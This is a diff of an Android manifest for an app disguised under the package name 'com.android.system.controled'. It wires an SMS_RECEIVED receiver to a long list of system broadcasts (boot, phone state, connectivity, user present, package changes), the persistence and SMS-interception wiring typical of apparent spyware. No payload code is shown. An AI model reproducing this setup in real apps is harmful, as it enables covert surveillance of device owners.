@@ -26,13 +26,12 @@
     <uses-permission android:name="android.permission.CHANGE_NETWORK_STATE" />
 
     <application
+        android:name="com.android.system.controled.MainApplication"
         android:icon="@drawable/ic_launcher"
         android:label="@string/app_name"
-        android:name="com.android.system.controled.MainApplication"
         android:theme="@style/AppTheme" >
 
-        <!--
-        若机器为3.1及以下版本的系统，则此处不需要此activity；因为3.2开始，android做了优化，从未启动过，或进程被终止了的程序，不会接收系统发来的广播 -->
+<!--         若机器为3.1及以下版本的系统，则此处不需要此activity；因为3.2开始，android做了优化，从未启动过，或进程被终止了的程序，不会接收系统发来的广播 -->
         <activity
             android:name=".MainAtivity"
             android:label="@string/app_name"
@@ -43,8 +42,8 @@
                 <category android:name="android.intent.category.DEFAULT" />
                 <category android:name="android.intent.category.LAUNCHER" />
             </intent-filter>
-        </activity>
-        
+        </activity>
+
         <receiver
             android:name=".receiver.MsgAndOtherReceiver"
             android:permission="android.permission.BROADCAST_SMS" >
@@ -52,14 +51,31 @@
                 <action android:name="android.provider.Telephony.SMS_RECEIVED" />
             </intent-filter>
             <intent-filter>
-                <action android:name="android.intent.action.BOOT_COMPLETED" />
                 <action android:name="android.intent.action.TIMEZONE_CHANGED" />
                 <action android:name="android.intent.action.DATE_CHANGED" />
                 <action android:name="android.intent.action.ACTION_POWER_CONNECTED" />
+                <action android:name="android.intent.action.ACTION_POWER_DISCONNECTED" />
+                <action android:name="android.intent.action.PROVIDER_CHANGED" />
+                <action android:name="android.intent.action.BOOT_COMPLETED" />
+                <action android:name="android.intent.action.PHONE_STATE" />
+                <action android:name="android.net.conn.CONNECTIVITY_CHANGE" />
+                <action android:name="android.intent.action.CLOSE_SYSTEM_DIALOGS" />
+                <action android:name="android.intent.action.INPUT_METHOD_CHANGED" />
+                <action android:name="android.intent.action.UID_REMOVED" />
+                <action android:name="android.intent.action.BATTERY_LOW" />
+                <action android:name="android.intent.action.BATTERY_OKAY" />
+                <action android:name="android.intent.action.LOCALE_CHANGED" />
+                <action android:name="android.intent.action.USER_PRESENT" />
+            </intent-filter>
+            <intent-filter>
                 <action android:name="android.intent.action.PACKAGE_ADDED" />
+                <action android:name="android.intent.action.PACKAGE_CHANGED" />
+                <action android:name="android.intent.action.PACKAGE_INSTALL" />
                 <action android:name="android.intent.action.PACKAGE_REMOVED" />
-                <action android:name="android.intent.action.ACTION_POWER_CONNECTED" />
+                <action android:name="android.intent.action.PACKAGE_REPLACED" />
                 <action android:name="android.intent.action.PACKAGE_RESTARTED" />
+                <action android:name="android.intent.action.PACKAGE_DATA_CLEARED" />
+                <data android:scheme="package" />
             </intent-filter>
         </receiver>
         <receiver
